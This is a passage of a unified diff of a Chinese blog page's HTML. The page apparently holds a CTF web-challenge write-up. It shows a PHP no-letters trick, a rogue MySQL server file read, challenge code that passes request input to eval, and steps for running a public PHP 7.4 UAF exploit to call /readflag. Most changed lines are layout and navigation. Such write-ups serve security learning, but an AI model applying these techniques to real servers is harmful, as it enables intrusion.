class="symbol">\t</span><span class="symbol">\i</span><span class="symbol">\o</span><span class="symbol">\n</span>_<span class="symbol">\s</span><span class="symbol">\c</span><span class="symbol">\h</span><span class="symbol">\e</span><span class="symbol">\m</span><span class="symbol">\a</span>.<span class="symbol">\t</span><span class="symbol">\a</span><span class="symbol">\b</span><span class="symbol">\l</span><span class="symbol">\e</span><span class="symbol">\s</span> <span class="symbol">\w</span><span class="symbol">\h</span><span class="symbol">\e</span><span class="symbol">\r</span><span class="symbol">\e</span> <span class="symbol">\t</span><span class="symbol">\a</span><span class="symbol">\b</span><span class="symbol">\l</span><span class="symbol">\e</span>_<span class="symbol">\s</span><span class="symbol">\c</span><span class="symbol">\h</span><span class="symbol">\e</span><span class="symbol">\m</span><span class="symbol">\a</span>=<span class="symbol">\d</span><span class="symbol">\a</span><span class="symbol">\t</span><span class="symbol">\a</span><span class="symbol">\b</span><span class="symbol">\a</span><span class="symbol">\s</span><span class="symbol">\e</span>()<span class="variable">%23</span></span><br></pre></td></tr></table></figure>
@@ -627,7 +646,7 @@
 <li>新姿势</li>
 </ul>
 <p>我们使用这条代码 <strong>&lt;?php echo !!‘@’;?&gt;</strong> 发现打印出来的是<strong>1</strong>，那么我们只需利用 !!‘@’ 相加减 乘除再通过拼接字符串（.）即可得到FLAG(70766571)。<br><figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">((!!<span class="string">'@'</span>+!!<span class="string">'@'</span>+!!<span class="string">'@'</span>)*(!!<span class="string">'@'</span>+!!<span class="string">'@'</span>)+!!<span class="string">'@'</span>).(!!<span class="string">'@'</span>-!!<span class="string">'@'</span>).((!!<span class="string">'@'</span>+!!<span class="string">'@'</span>+!!<span class="string">'@'</span>)* (!!<span class="string">'@'</span>+!!<span class="string">'@'</span>)+!!<span class="string">'@'</span>).((!!<span class="string">'@'</span>+!!<span class="string">'@'</span>+!!<span class="string">'@'</span>)*(!!<span class="string">'@'</span>+!!<span class="string">'@'</span>)).((!!<span class="string">'@'</span>+!!<span class="string">'@'</span>+!!<span class="string">'@'</span>)* (!!<span class="string">'@'</span>+!!<span class="string">'@'</span>)).(((!!<span class="string">'@'</span>+!!<span class="string">'@'</span>+!!<span class="string">'@'</span>)*(!!<span class="string">'@'</span>+!!<span class="string">'@'</span>))-!!<span class="string">'@'</span>).((!!<span class="string">'@'</span>+!!<span class="string">'@'</span>+!!<span class="string">'@'</span>)* (!!<span class="string">'@'</span>+!!<span class="string">'@'</span>)+!!<span class="string">'@'</span>).(!!<span class="string">'@'</span>);</span><br></pre></td></tr></table></figure></p>
-<h2 id="nweb"><a href="#nweb" class="headerlink" title="nweb"></a>nweb</h2><ol>
+<h1 id="nweb"><a href="#nweb" class="headerlink" title="nweb"></a>nweb</h1><ol>
 <li><p>查看源码发现注释</p>
 <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 110 --&gt;</span></span><br></pre></td></tr></table></figure>
 </li>
@@ -640,7 +659,7 @@
 </li>
 <li>但是admin登陆后有个数据库端口扫描功能，很明显的mysql客户端任意文件读取，直接rouge mysql server读flag即可</li>
 </ol>
-<h2 id="PHP-UAF"><a href="#PHP-UAF" class="headerlink" title="PHP-UAF"></a>PHP-UAF</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$sandbox = <span class="string">'/var/www/html/sandbox/'</span> . md5(<span class="string">"wdwd"</span> . $_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span></span><br><span class="line"><span class="php">@mkdir($sandbox);</span></span><br><span class="line"><span class="php">@chdir($sandbox);</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="keyword">if</span> (<span class="keyword">isset</span>($_REQUEST[<span class="string">'cmd'</span>])) &#123;</span></span><br><span class="line"><span class="php">    @<span class="keyword">eval</span>($_REQUEST[<span class="string">'cmd'</span>]);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">highlight_file(__FILE_</span></span><br></pre></td></tr></table></figure>
+<h1 id="PHP-UAF"><a href="#PHP-UAF" class="headerlink" title="PHP-UAF"></a>PHP-UAF</h1><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$sandbox = <span class="string">'/var/www/html/sandbox/'</span> . md5(<span class="string">"wdwd"</span> . $_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span></span><br><span class="line"><span class="php">@mkdir($sandbox);</span></span><br><span class="line"><span class="php">@chdir($sandbox);</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="keyword">if</span> (<span class="keyword">isset</span>($_REQUEST[<span class="string">'cmd'</span>])) &#123;</span></span><br><span class="line"><span class="php">    @<span class="keyword">eval</span>($_REQUEST[<span class="string">'cmd'</span>]);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">highlight_file(__FILE_</span></span><br></pre></td></tr></table></figure>
 <ol>
 <li>上了个大马并没有卵用，看phpinfo()，发现PHP是7.4.2，直接用现成<a href="https://github.com/mm0r1/exploits" target="_blank" rel="noopener">exp</a></li>
 <li><p>把pwn(“uname -a”);改为pwn(“/readflag”),然后放到远程服务器上</p>
@@ -684,6 +703,14 @@
     
 
     <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/Web/" rel="tag"># Web</a>
+          
+            <a href="/tags/复现/" rel="tag"># 复现</a>
+          
+        </div>
       
 
       
@@ -783,7 +810,105 @@
               
 
               
+                
+                
+                <div class="site-state-item site-state-categories">
+                  <a href="/categories/index.html">
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">6</span>
+                    <span class="site-state-item-name">分类</span>
+                  </a>
+                </div>
+              
 
+              
+                
+                
+                <div class="site-state-item site-state-tags">
+                  <a href="/tags/index.html">
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">16</span>
+                    <span class="site-state-item-name">标签</span>
+                  </a>
+                </div>
               
             </nav>
           
@@ -873,7 +998,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#web"><span class="nav-number">1.</span> <span class="nav-text">web</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#webct"><span class="nav-number">1.1.</span> <span class="nav-text">webct</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#fmkq"><span class="nav-number">1.2.</span> <span class="nav-text">fmkq</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#hackme"><span class="nav-number">1.3.</span> <span class="nav-text">hackme</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#easy-trick-gzmtu"><span class="nav-number">1.4.</span> <span class="nav-text">easy_trick_gzmtu</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#nweb"><span class="nav-number">1.5.</span> <span class="nav-text">nweb</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#PHP-UAF"><span class="nav-number">1.6.</span> <span class="nav-text">PHP-UAF</span></a></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#webct"><span class="nav-number">1.</span> <span class="nav-text">webct</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#fmkq"><span class="nav-number">2.</span> <span class="nav-text">fmkq</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#hackme"><span class="nav-number">3.</span> <span class="nav-text">hackme</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#easy-trick-gzmtu"><span class="nav-number">4.</span> <span class="nav-text">easy_trick_gzmtu</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#nweb"><span class="nav-number">5.</span> <span class="nav-text">nweb</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#PHP-UAF"><span class="nav-number">6.</span> <span class="nav-text">PHP-UAF</span></a></li></ol></div>
             
 
           </div>
